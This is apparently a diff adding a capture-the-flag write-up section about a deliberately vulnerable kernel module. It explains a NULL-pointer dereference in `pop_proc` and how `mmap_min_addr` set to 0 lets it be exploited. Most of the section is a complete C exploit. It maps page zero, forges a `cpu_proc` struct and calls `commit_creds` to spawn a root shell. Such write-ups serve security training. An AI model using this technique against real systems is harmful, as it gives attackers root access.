@@ -410,3 +410,175 @@ struct cpu_proc* pop_proc(void) {
 
 ### Vulnerability
 
+The vulnerability exists in `pop_proc`, where the function assumes that `head` is non-NULL. It does not validate whether the scheduler list is empty before attempting to locate and unlink the highest-priority process.
+
+If `head` is `NULL`, both `cur` and `min` are initialized to NULL. When execution reaches:
+
+```c
+if (!minPrev)
+    head = min->next;   // NULL pointer dereference
+```
+
+the code dereferences `min`, which is `NULL`, resulting in a kernel NULL pointer dereference.
+
+To trigger this condition, we can remove all processes from the list. 
+
+Once the list becomes empty, `head` is set to `NULL`. A subsequent call to `pop_proc` will then operate on a NULL head pointer, leading to the crash.
+
+But how to exploit this?
+
+### Exploitation
+
+From the `mmap` manual page:
+
+![mmap](mmap.png)
+
+```
+If addr is NULL, then the kernel chooses the (page-aligned) address at which to create the mapping; this is the most portable method of creating a new mapping.  If  addr  is  not NULL, then the kernel takes it as a hint about where to place the mapping; on Linux, the kernel will pick a nearby page boundary (but always above or equal to the value specified by /proc/sys/vm/mmap_min_addr) and attempt to create the mapping there.
+```
+
+This means that `/proc/sys/vm/mmap_min_addr` defines the lowest virtual memory address that a process is permitted to map.
+
+Inspecting the running kernel configuration shows that `/proc/sys/vm/mmap_min_addr` is set to 0. This means userland is permitted to map memory at address 0x0.
+
+```bash
+/ $ cat /proc/sys/vm/mmap_min_addr
+0
+/ $ 
+```
+
+As a result, it becomes possible to deliberately map a controlled memory region at address 0. When the NULL pointer dereference in `pop_proc` occurs, the kernel will dereference a pointer at address 0, allowing the attacker to control the data being accessed.
+
+Although `proc_read` contains a check:
+
+```c
+struct cpu_proc* pr = pop_proc();
+if (!pr)
+	printk(KERN_INFO "[!] pls no hack me :P\n");
+```
+
+This isn't a problem because by crafting a fake `cpu_proc` structure at address `0` and setting its next pointer to a controlled memory region, a call to `pop_proc` will update head to the controlled memory.
+
+And with this we've hijacked the `cpu_proc` structure.
+
+Since we can then make any arbitrary function call, we simply set the `compute` field to a userspace function which would update the process credential and after we return from the file operation (proc_read) we can then spawn a shell!
+
+Here's my exploit script:
+
+```c
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include "log.h"
+
+#define SIZE 4
+
+typedef struct cpu_proc {
+    struct cpu_proc *next;
+    long prio;
+    void (*compute)(void);
+} cpu_proc;
+
+uint32_t pr_size = sizeof(cpu_proc);
+
+uint64_t user_cs, user_ss, user_sp, user_rflags, user_rip, fd, prio;;
+
+uint64_t prepare_kernel_cred = 0xffffffff8104f850;
+uint64_t commit_creds = 0xffffffff8104f520;
+
+void spawn_shell()
+{
+    logInfo("Escalating privilege..")
+    if (getuid() == 0) {
+        char *argv[] = {"/bin/sh", NULL};
+        char *envp[] = {NULL};
+        execve(argv[0], argv, envp);
+    } else {
+        errExit("Privilege escalation failed");
+    }
+}
+
+void privesc() {
+    asm(
+        ".intel_syntax noprefix;"
+        "xor rdi, rdi;"
+        "mov r15, prepare_kernel_cred;"
+        "call r15;"
+        "mov rdi, rax;"
+        "mov r15, commit_creds;"
+        "call r15;"
+        ".att_syntax"
+    );
+
+}
+
+void pop_queue() {
+    read(fd, &prio, sizeof(prio));
+}
+
+void push_queue(char *prio_level) {
+    write(fd, prio_level, 2);
+}
+
+void clear_proc(void) {
+    logInfo("Clearing process queue...");
+    for (int i = 0; i < (SIZE); i++) {
+        pop_queue();
+    }
+    logOK("Done!");
+}
+
+int main(void) {
+
+    fd = open("/proc/sched", O_RDWR);
+    if (fd == -1)
+        errExit("open");
+
+    clear_proc();
+
+    logInfo("Allocating memory for null pointer deference..");
+    void *addr = mmap(0, 0x1000,
+                    PROT_READ|PROT_WRITE|PROT_EXEC,
+                    MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,
+                    -1, 0);
+
+    void *new_list = mmap((void *)0xdead0000, 0x1000,
+                        PROT_READ|PROT_WRITE|PROT_EXEC,
+                        MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,
+                        -1, 0);
+
+    if (addr != 0 || new_list != (void *)0xdead0000) {
+        errExit("mmap");
+    }
+
+    *(uint64_t *)addr = (uint64_t)new_list;
+
+    logInfo("Corrupting linked list [head]..");
+    pop_queue();
+
+    struct cpu_proc *pr = malloc(pr_size);
+    pr->next = NULL;
+    pr->prio = 1;
+    pr->compute = privesc;
+
+    logInfo("Forging fake cpu_proc struct..");
+    memcpy(new_list, pr, pr_size);
+    push_queue("5");
+    
+    logInfo("Triggering function pointer..");
+    pop_queue();
+
+    spawn_shell();
+
+    return 0;
+}
+```
+
+Running it, we achieve LPE!
+
+![lpe](lpe.png)
